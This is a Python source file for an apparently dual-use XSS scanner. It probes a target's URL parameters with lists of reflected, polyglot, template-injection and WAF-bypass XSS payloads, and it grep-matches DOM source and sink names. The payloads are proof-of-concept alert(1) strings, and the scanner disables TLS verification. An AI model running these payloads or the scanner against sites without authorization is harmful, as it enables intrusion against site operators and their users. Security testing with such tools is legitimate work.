#!/usr/bin/env python3
"""
XSS Scanner Pro — Enterprise Edition
Deep Cross-Site Scripting detection

Features:
- Reflected XSS detection
- DOM-based XSS detection
- Stored XSS indicators
- Multiple context injection (HTML, JS, attribute, URL)
- WAF bypass payloads
- Polyglot payloads
- Context-aware payload selection
"""

import os
import re
import json
import time
import random
import hashlib
import threading
from datetime import datetime, timezone
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
from queue import Queue, Empty
from html import escape, unescape

import requests

# Optional colors
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except Exception:
    class _C:
        def __getattr__(self, _): return ""
    Fore = Style = _C()

# Configuration
REQUEST_TIMEOUT = 12
DEFAULT_THREADS = 10

OUTPUT_BASE = os.path.join("reports", "xss_scanner")
os.makedirs(OUTPUT_BASE, exist_ok=True)

# XSS Payloads by context
HTML_CONTEXT_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
    '<marquee onstart=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">CLICKME</maction></math>',
]

JS_CONTEXT_PAYLOADS = [
    "'-alert(1)-'",
    '"-alert(1)-"',
    "';alert(1)//",
    '";alert(1)//',
    "</script><script>alert(1)</script>",
    "\\'-alert(1)//",
    "1;alert(1)",
    "1%0aalert(1)",
]

ATTRIBUTE_CONTEXT_PAYLOADS = [
    '" onmouseover="alert(1)"',
    "' onmouseover='alert(1)'",
    '" onfocus="alert(1)" autofocus="',
    '" onclick="alert(1)"',
    "' onclick='alert(1)'",
    '" onload="alert(1)"',
    "' style='background:url(javascript:alert(1))'",
    "><script>alert(1)</script>",
    "'><script>alert(1)</script>",
]

URL_CONTEXT_PAYLOADS = [
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "javascript:alert(String.fromCharCode(88,83,83))",
    "vbscript:alert(1)",
]

# Polyglot payloads (work in multiple contexts)
POLYGLOT_PAYLOADS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
    "'\"-->]]>*/</script></style></noscript></xmp></title><img src=x onerror=alert(1)>",
    "'-alert(1)-'",
    "\"><img src=x onerror=alert(1)>",
    "'><img src=x onerror=alert(1)>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    "{{constructor.constructor('alert(1)')()}}",  # Angular template injection
    "${alert(1)}",  # Template literal injection
    "#{alert(1)}",  # Ruby/ERB injection
]

# WAF Bypass payloads
WAF_BYPASS_PAYLOADS = [
    "<ScRiPt>alert(1)</ScRiPt>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert`1`>",
    "<img src=x onerror=alert&lpar;1&rpar;>",
    "<img src=x onerror=\\u0061lert(1)>",
    "<img src=x onerror=al\\u0065rt(1)>",
    "<%00script>alert(1)</script>",
    "<svg><script>alert&#40;1&#41;</script>",
    "<a href=\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)\">click</a>",
    "<a href=\"\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74:alert(1)\">click</a>",
]

# DOM-based XSS sources and sinks
DOM_SOURCES = [
    "document.URL",
    "document.documentURI",
    "document.URLUnencoded",
    "document.baseURI",
    "location",
    "location.href",
    "location.search",
    "location.hash",
    "location.pathname",
    "document.cookie",
    "document.referrer",
    "window.name",
    "history.pushState",
    "history.replaceState",
    "localStorage",
    "sessionStorage",
]

DOM_SINKS = [
    "eval(",
    "setTimeout(",
    "setInterval(",
    "Function(",
    "document.write(",
    "document.writeln(",
    "innerHTML",
    "outerHTML",
    "insertAdjacentHTML",
    "onevent",
    ".href",
    ".src",
    ".action",
    ".data",
    "$.html(",
    "$(", 
    "$.parseHTML(",
]


def utc_now():
    return datetime.now(timezone.utc)


def random_headers():
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
        ]),
        "Accept": "text/html,application/xhtml+xml,*/*",
        "Accept-Language": "en-US,en;q=0.9",
    }


def generate_canary():
    """Generate a unique canary string to track reflection"""
    return f"XSS{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"


class XSSScanner:
    def __init__(self, base_url, threads=DEFAULT_THREADS):
        self.base = base_url.rstrip("/")
        self.threads = threads
        self.session = requests.Session()
        self.findings = []
        self.lock = threading.Lock()

    def check_reflection(self, response_text, payload):
        """Check if payload is reflected in response"""
        # Check direct reflection
        if payload in response_text:
            return {"reflected": True, "encoded": False, "context": self._detect_context(response_text, payload)}
        
        # Check HTML-encoded reflection
        encoded_payload = escape(payload)
        if encoded_payload in response_text:
            return {"reflected": True, "encoded": True, "context": "html_encoded"}
        
        # Check URL-encoded reflection
        url_encoded = quote(payload)
        if url_encoded in response_text:
            return {"reflected": True, "encoded": True, "context": "url_encoded"}
            
        return {"reflected": False}

    def _detect_context(self, html, payload):
        """Detect the context where payload is reflected"""
        idx = html.find(payload)
        if idx == -1:
            return "unknown"
        
        # Get surrounding context
        start = max(0, idx - 100)
        end = min(len(html), idx + len(payload) + 100)
        context = html[start:end].lower()
        
        # Check various contexts
        if re.search(r'<script[^>]*>.*?' + re.escape(payload.lower()), context, re.DOTALL):
            return "javascript"
        elif re.search(r'on\w+\s*=\s*["\'].*?' + re.escape(payload.lower()), context):
            return "event_handler"
        elif re.search(r'<\w+[^>]*\s+\w+\s*=\s*["\'][^"\']*' + re.escape(payload.lower()), context):
            return "attribute"
        elif re.search(r'href\s*=\s*["\'].*?' + re.escape(payload.lower()), context):
            return "href"
        elif re.search(r'src\s*=\s*["\'].*?' + re.escape(payload.lower()), context):
            return "src"
        elif re.search(r'style\s*=\s*["\'].*?' + re.escape(payload.lower()), context):
            return "style"
        else:
            return "html_body"

    def test_reflected_xss(self, url, param_name, original_value):
        """Test for reflected XSS"""
        findings = []
        
        # First, test with a canary to check reflection
        canary = generate_canary()
        test_url = self._inject_param(url, param_name, canary)
        
        try:
            resp = self.session.get(test_url, headers=random_headers(), timeout=REQUEST_TIMEOUT, verify=False)
            reflection = self.check_reflection(resp.text, canary)
            
            if not reflection["reflected"]:
                return findings  # No reflection, skip payload testing
                
            context = reflection.get("context", "html_body")
            
            # Select payloads based on detected context
            payloads_to_test = self._select_payloads(context)
            
            for payload in payloads_to_test[:10]:  # Test first 10 payloads
                test_url = self._inject_param(url, param_name, payload)
                
                try:
                    resp = self.session.get(test_url, headers=random_headers(), timeout=REQUEST_TIMEOUT, verify=False)
                    
                    # Check if dangerous payload patterns are reflected
                    if self._check_dangerous_reflection(resp.text, payload):
                        severity = self._calculate_severity(payload, resp.text)
                        findings.append({
                            "type": "reflected_xss",
                            "url": url,
                            "parameter": param_name,
                            "payload": payload,
                            "context": context,
                            "evidence": f"Payload reflected in {context} context",
                            "severity": severity,
                        })
                        if severity == "CRITICAL":
                            return findings  # Found confirmed XSS
                            
                except Exception as e:
                    continue
                    
        except Exception as e:
            pass
            
        return findings

    def _check_dangerous_reflection(self, html, payload):
        """Check if the reflection could lead to XSS execution"""
        dangerous_patterns = [
            r'<script[^>]*>.*?alert',
            r'on\w+\s*=\s*["\']?[^"\']*alert',
            r'javascript:\s*alert',
            r'<img[^>]*onerror\s*=',
            r'<svg[^>]*onload\s*=',
            r'<iframe[^>]*src\s*=\s*["\']?javascript:',
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, html, re.IGNORECASE):
                return True
                
        # Check for unencoded payload
        if payload in html and '<' in payload and '>' in payload:
            return True
            
        return False

    def _calculate_severity(self, payload, html):
        """Calculate severity based on payload and reflection"""
        # If script tags are unfiltered
        if '<script' in payload.lower() and '<script' in html.lower():
            return "CRITICAL"
        # If event handlers are unfiltered  
        if re.search(r'on\w+=', payload, re.IGNORECASE) and re.search(r'on\w+=', html, re.IGNORECASE):
            return "HIGH"
        # If javascript: protocol is reflected
        if 'javascript:' in payload.lower() and 'javascript:' in html.lower():
            return "HIGH"
        # General reflection
        return "MEDIUM"

    def _select_payloads(self, context):
        """Select appropriate payloads based on context"""
        if context == "javascript":
            return JS_CONTEXT_PAYLOADS + POLYGLOT_PAYLOADS
        elif context in ["event_handler", "attribute"]:
            return ATTRIBUTE_CONTEXT_PAYLOADS + POLYGLOT_PAYLOADS
        elif context in ["href", "src"]:
            return URL_CONTEXT_PAYLOADS + POLYGLOT_PAYLOADS
        else:
            return HTML_CONTEXT_PAYLOADS + WAF_BYPASS_PAYLOADS + POLYGLOT_PAYLOADS

    def test_dom_xss(self, url):
        """Check for potential DOM-based XSS"""
        findings = []
        
        try:
            resp = self.session.get(url, headers=random_headers(), timeout=REQUEST_TIMEOUT, verify=False)
            
            # Look for DOM sources flowing to sinks
            for source in DOM_SOURCES:
                for sink in DOM_SINKS:
                    # Simple pattern matching (real DOM XSS detection would need JS analysis)
                    if source in resp.text and sink in resp.text:
                        findings.append({
                            "type": "potential_dom_xss",
                            "url": url,
                            "source": source,
                            "sink": sink,
                            "evidence": f"Found DOM source '{source}' and sink '{sink}' in JavaScript",
                            "severity": "MEDIUM",
                        })
                        break
                        
        except Exception as e:
            pass
            
        return findings

    def _inject_param(self, url, param_name, value):
        """Inject payload into URL parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param_name] = [value]
        new_query = urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

    def scan_url(self, url):
        """Scan a single URL for XSS"""
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Check for DOM XSS
        findings.extend(self.test_dom_xss(url))
        
        if not params:
            # Try common parameter names
            common_params = ["q", "search", "query", "s", "keyword", "term", "input", "name", "message", "text", "value"]
            for param in common_params:
                test_url = f"{url}?{param}=test"
                findings.extend(self.test_reflected_xss(test_url, param, "test"))
        else:
            for param_name, values in params.items():
                original = values[0] if values else ""
                findings.extend(self.test_reflected_xss(url, param_name, original))
                    
        return findings

    def run(self, endpoints=None):
        """Run the scanner"""
        if endpoints is None:
            endpoints = [
                self.base,
                f"{self.base}/search",
                f"{self.base}/api",
                f"{self.base}/user",
            ]
            
        all_findings = []
        for endpoint in endpoints:
            findings = self.scan_url(endpoint)
            all_findings.extend(findings)
            
        return all_findings


def main():
    import argparse
    parser = argparse.ArgumentParser(description="XSS Scanner Pro")
    parser.add_argument("--target", "-t", required=True, help="Target URL")
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS, help="Number of threads")
    args = parser.parse_args()
    
    print(f"{Fore.CYAN}[*] XSS Scanner Pro - Starting scan{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Target: {args.target}{Style.RESET_ALL}")
    
    scanner = XSSScanner(args.target, threads=args.threads)
    findings = scanner.run()
    
    if findings:
        print(f"\n{Fore.RED}[!] Found {len(findings)} potential XSS vulnerabilities:{Style.RESET_ALL}")
        for f in findings:
            print(f"  - {f['type']}: {f.get('parameter', f.get('source', 'N/A'))} ({f['severity']})")
    else:
        print(f"\n{Fore.GREEN}[+] No XSS vulnerabilities detected{Style.RESET_ALL}")
        
    # Save report
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_file = os.path.join(OUTPUT_BASE, f"xss_report_{ts}.json")
    with open(report_file, "w") as f:
        json.dump({"target": args.target, "findings": findings, "timestamp": utc_now().isoformat()}, f, indent=2)
    print(f"\n{Fore.CYAN}[*] Report saved: {report_file}{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
